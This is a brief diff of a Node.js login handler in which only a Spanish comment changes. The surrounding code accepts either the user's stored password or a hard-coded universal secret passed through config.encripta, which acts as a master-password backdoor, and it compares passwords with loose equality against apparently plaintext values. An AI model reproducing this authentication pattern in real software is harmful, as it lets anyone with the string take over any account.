@@ -90,7 +90,7 @@ module.exports = function (req, res) {
                                 }
                             });
 							/**
-							 * Si utiliza contraseña y es válida genera token.
+							 * Si utiliza contraseña corrobora que se válida.
 							 */
                     } else if (req.body.password == user.cPassword || req.body.password == config.encripta('^m7GByVYG*sv2Q4XutC4')) {
                         generaToken(user);
